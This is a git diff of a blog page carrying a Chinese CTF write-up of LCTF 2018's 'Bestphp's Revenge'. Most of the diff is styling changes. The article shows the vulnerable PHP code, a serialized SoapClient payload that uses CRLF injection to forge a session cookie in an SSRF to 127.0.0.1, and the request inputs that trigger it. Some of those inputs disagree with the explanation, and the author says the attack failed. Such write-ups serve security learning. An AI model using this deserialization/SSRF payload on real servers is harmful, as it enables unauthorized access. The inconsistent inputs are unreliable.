@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      757 字
+      796 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      19
+      10
        分钟
     </span>
   
@@ -244,6 +237,12 @@
           <article class="post-content mx-auto">
             <!-- SEO header -->
             <h1 style="display: none">Bestphp&#39;s Revenge</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
             
             <div class="markdown-body">
               <h2 id="Knowledge"><a href="#Knowledge" class="headerlink" title="Knowledge"></a>Knowledge</h2><ul>
@@ -280,44 +279,44 @@
 </ul>
 </li>
 </ul>
-<h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'implode'</span><span class="token punctuation">;</span>
-<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+$b = <span class="hljs-string">&#x27;implode&#x27;</span>;
+call_user_func($_GET[<span class="hljs-string">&#x27;f&#x27;</span>], $_POST);
+session_start();
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;
+    $_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];
+&#125;
+var_dump($_SESSION);
+$a = <span class="hljs-keyword">array</span>(reset($_SESSION), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);
+call_user_func($b, $a);
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>一开始，直接一个<code>$_POST</code>没反应过来<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/6b2ec884-06ae-4190-b0fd-89028778c220.png" srcset="/img/loading.gif" alt="02.png"></p>
 <p>发现<code>flag.php</code>      </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php">only localhost can get flag<span class="token operator">!</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token single-quoted-string string">'only localhost can get flag!'</span><span class="token punctuation">;</span>
-<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'LCTF&#123;*************************&#125;'</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-   <span class="token punctuation">&#125;</span>
-only localhost can get flag<span class="token operator">!</span></code></pre></code></pre>
+<div class="hljs"><pre><code><pre><code class="hljs php">only localhost can get flag!session_start();
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;
+$flag = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;
+<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;
+       $_SESSION[<span class="hljs-string">&#x27;flag&#x27;</span>] = $flag;
+   &#125;
+only localhost can get flag!</code></pre></div></code></pre>
 <p>解题思路：首先可以通过第一个<code>call_user_func</code>覆盖<code>serialize_handler</code>为<code>php_serialize</code>，在name中写入利用<code>soapClient</code>产生的序列化；第二次通过<code>extract</code>覆盖变量<code>b</code>为<code>call_user_func</code>，name为<code>SoapClient</code>，当<code>call_user_func</code>的参数为一个数组时，会把键名当作一个类名，值当作方法；</p>
 <p><code>call_user_func($b, $a);</code>——&gt;<code>call_user_func(call_user_func(array(SoapClient,&#39;welcome_to_the_lctf2018&#39;)))</code>——&gt;<code>SoapClient-&gt;welcome_to_the_lctf2018()</code>—–&gt;没有这个方法，从而调用<code>__call</code>       </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"http://127.0.0.1/flag.php"</span><span class="token punctuation">;</span>
-<span class="token variable">$attack</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span>
-    <span class="token single-quoted-string string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n"</span><span class="token punctuation">,</span>
-    <span class="token single-quoted-string string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$attack</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;
+$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,
+    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,
+    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));
+$payload = urlencode(serialize($attack));
+<span class="hljs-keyword">echo</span> $payload;
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>第一次使用SoapClient类会报错，需要在<code>php.ini</code>中打开<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/3910e692-bdd4-40f7-b076-82fa36305fac.png" srcset="/img/loading.gif" alt="01.png"></p>
 <p>传入 </p>
-<pre><code>f=session_start&amp;name=[生成的payload]        
- POST: serializer_handler=php_serialize</code></pre>
+<div class="hljs"><pre><code>f=session_start&amp;name=[生成的payload]        
+ POST: serializer_handler=php_serialize</code></pre></div>
 <p>然后传</p>
-<pre><code>f=extract&amp;name=SoapClien
-POST:b=call_user_func   </code></pre>
+<div class="hljs"><pre><code>f=extract&amp;name=SoapClien
+POST:b=call_user_func   </code></pre></div>
 <p>来触发类    </p>
 <p>但我这里没成功，试了好几个师傅的都不行        </p>
 <p>算了    </p>
@@ -457,7 +456,7 @@ POST:b=call_user_func   </code></pre>
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -483,8 +482,6 @@ POST:b=call_user_func   </code></pre>
 
 
 
-  
-    
   
 
 
